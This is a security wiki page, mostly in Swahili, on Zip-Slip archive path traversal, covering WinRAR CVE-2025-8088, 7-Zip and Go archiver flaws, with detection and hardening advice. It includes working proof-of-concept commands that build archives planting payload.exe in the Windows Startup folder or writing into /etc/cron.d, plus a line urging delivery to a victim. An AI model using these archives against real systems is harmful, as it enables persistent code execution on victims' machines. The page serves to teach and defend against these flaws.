# Archive Extraction Path Traversal ("Zip-Slip" / WinRAR CVE-2025-8088)

{{#include ../banners/hacktricks-training.md}}

## Muhtasari

Miundo mingi ya archive (ZIP, RAR, TAR, 7-ZIP, n.k.) huruhusu kila kipengee kubeba **internal path** yake mwenyewe. Wakati utility ya uchimbaji inaheshimu bila kuangalia njia hiyo, jina la faili lililotengenezwa likiwa na `..` au **absolute path** (mf. `C:\Windows\System32\`) litaandikwa nje ya saraka iliyochaguliwa na mtumiaji.
Aina hii ya udhaifu inajulikana sana kama *Zip-Slip* au **archive extraction path traversal**.

Madhara yanaanzia kuandika juu ya faili yoyote hadi kupata moja kwa moja **remote code execution (RCE)** kwa kuacha payload katika eneo la **auto-run** kama vile folda ya Windows *Startup*.

## Chanzo

1. Mshambuliaji anaunda archive ambapo moja au zaidi ya vichwa vya faili vina:
* Relative traversal sequences (`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`)
* Absolute paths (`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe`)
* Au crafted **symlinks** ambazo zinaelekeza nje ya saraka lengwa (zinaonekana mara kwa mara katika ZIP/TAR kwenye *nix*).
2. Mhasiriwa anachoma/archive hiyo kwa kutumia zana yenye udhaifu inayomwamini njia iliyowekwa ndani (au inafuata symlinks) badala ya kuisafisha au kulazimisha uchimbaji chini ya saraka iliyochaguliwa.
3. Faili hilo linaandikwa mahali pa kudhibitiwa na mshambuliaji na litaenda kutekelezwa/kupakiwa mara ijayo mfumo au mtumiaji atakapochochea njia hiyo.

### .NET `Path.Combine` + `ZipArchive` traversal

Mfano mbaya wa kawaida katika .NET ni kuchanganya eneo linalokusudiwa na **user-controlled** `ZipArchiveEntry.FullName` na kuchoma bila path normalisation:
```csharp
using (var zip = ZipFile.OpenRead(zipPath))
{
foreach (var entry in zip.Entries)
{
var dest = Path.Combine(@"C:\samples\queue\", entry.FullName); // drops base if FullName is absolute
entry.ExtractToFile(dest);
}
}
```
- Ikiwa `entry.FullName` inaanza na `..\\` hufanya traversal; ikiwa ni **absolute path** sehemu ya kushoto inakatwa kabisa, ikasababisha **arbitrary file write** kama kitambulisho cha uondoaji.
- Mfano wa proof-of-concept wa archive ili kuandika katika saraka jirani ya `app` inayotazamwa na scanner iliyopangwa:
```python
import zipfile
with zipfile.ZipFile("slip.zip", "w") as z:
z.writestr("../app/0xdf.txt", "ABCD")
```
Kuweka ZIP hiyo kwenye inbox inayofuatiliwa kunasababisha faili `C:\samples\app\0xdf.txt`, ikithibitisha traversal nje ya `C:\samples\queue\` na kuwezesha follow-on primitives (mfano, DLL hijacks).

## Mfano Halisi – WinRAR ≤ 7.12 (CVE-2025-8088)

WinRAR kwa Windows (ikijumuisha `rar` / `unrar` CLI, DLL na portable source) ilishindwa kuthibitisha majina ya faili wakati wa uondoaji.
Archive ya RAR yenye madhumuni mabaya iliyo na kipengee kama:
```text
..\..\..\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe
```
itatokea **nje ya** direktori ya pato iliyochaguliwa na ndani ya folder ya *Startup* ya mtumiaji. Baada ya kuingia, Windows hufanya utekelezaji wa kila kitu kilichopo hapo, ikitoa RCE *inayodumu*.

### Kutengeneza PoC Archive (Linux/Mac)
```bash
# Requires rar >= 6.x
mkdir -p "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cp payload.exe "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
rar a -ep evil.rar evil/*
```
Chaguzi zilizotumika:
* `-ep`  – hifadhi njia za faili kamili kama zilivyo (do **not** prune leading `./`).

Mletee `evil.rar` kwa mwathiriwa na umuelekeze aifungue kwa toleo la WinRAR lenye udhaifu.

### Observed Exploitation in the Wild

ESET iliripoti kampeni za spear-phishing za RomCom (Storm-0978/UNC2596) ambazo zilishikilia RAR archives zikitumia CVE-2025-8088 kujisafirisha backdoors zilizobinafsishwa na kurahisisha operesheni za ransomware.

## Newer Cases (2024–2025)

### 7-Zip ZIP symlink traversal → RCE (CVE-2025-11001 / ZDI-25-949)
* **Bug**: ZIP entries that are **symbolic links** were dereferenced during extraction, letting attackers escape the destination directory and overwrite arbitrary paths. User interaction is just *opening/extracting* the archive.
* **Affected**: 7-Zip 21.02–24.09 (Windows & Linux builds). Fixed in **25.00** (July 2025) and later.
* **Impact path**: Overwrite `Start Menu/Programs/Startup` or service-run locations → code runs at next logon or service restart.
* **Quick PoC (Linux)**:
```bash
mkdir -p out
ln -s /etc/cron.d evil
zip -y exploit.zip evil   # -y preserves symlinks
7z x exploit.zip -o/tmp/target   # vulnerable 7-Zip writes to /etc/cron.d
```
On a patched build `/etc/cron.d` won’t be touched; the symlink is extracted as a link inside /tmp/target.

### Go mholt/archiver Unarchive() Zip-Slip (CVE-2025-3445)
* **Bug**: `archiver.Unarchive()` follows `../` and symlinked ZIP entries, writing outside `outputDir`.
* **Affected**: `github.com/mholt/archiver` ≤ 3.5.1 (project now deprecated).
* **Fix**: Switch to `mholt/archives` ≥ 0.1.0 or implement canonical-path checks before write.
* **Minimal reproduction**:
```go
// go test . with archiver<=3.5.1
archiver.Unarchive("exploit.zip", "/tmp/safe")
// exploit.zip holds ../../../../home/user/.ssh/authorized_keys
```

## Detection Tips

* **Static inspection** – Orodhesha vipengee vya archive na angazia majina yoyote yenye `../`, `..\\`, *absolute paths* (`/`, `C:`) au vipengee vya aina ya *symlink* ambavyo lengo lao liko nje ya directory ya uondoaji.
* **Canonicalisation** – Hakikisha `realpath(join(dest, name))` bado inaanza na `dest`. Kataa vinginevyo.
* **Sandbox extraction** – Decompress ndani ya directory inayoweza kutupwa ukitumia extractor *salama* (mfano, `bsdtar --safe --xattrs --no-same-owner`, 7-Zip ≥ 25.00) na thibitisha kuwa njia zinazotokana ziko ndani ya directory hiyo.
* **Endpoint monitoring** – Toa tahadhari juu ya executables mpya zilizooandikwa kwenye maeneo ya `Startup`/`Run`/`cron` muda mfupi baada ya archive kufunguliwa na WinRAR/7-Zip/etc.

## Mitigation & Hardening

1. **Update the extractor** – WinRAR 7.13+ and 7-Zip 25.00+ zinafanya sanitisation ya path/symlink. Zana zote mbili bado hazina auto-update.
2. Extract archives with “**Do not extract paths**” / “**Ignore paths**” when possible.
3. On Unix, drop privileges & mount a **chroot/namespace** before extraction; on Windows, use **AppContainer** or a sandbox.
4. If writing custom code, normalise with `realpath()`/`PathCanonicalize()` **before** create/write, and reject any entry that escapes the destination.

## Additional Affected / Historical Cases

* 2018 – Massive *Zip-Slip* advisory by Snyk affecting many Java/Go/JS libraries.
* 2023 – 7-Zip CVE-2023-4011 similar traversal during `-ao` merge.
* 2025 – HashiCorp `go-slug` (CVE-2025-0377) TAR extraction traversal in slugs (patch in v1.2).
* Any custom extraction logic that fails to call `PathCanonicalize` / `realpath` prior to write.

## References

- [Trend Micro ZDI-25-949 – 7-Zip symlink ZIP traversal (CVE-2025-11001)](https://www.zerodayinitiative.com/advisories/ZDI-25-949/)
- [JFrog Research – mholt/archiver Zip-Slip (CVE-2025-3445)](https://research.jfrog.com/vulnerabilities/archiver-zip-slip/)
- [Meziantou – Prevent Zip Slip in .NET](https://www.meziantou.net/prevent-zip-slip-in-dotnet.htm)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)

{{#include ../banners/hacktricks-training.md}}
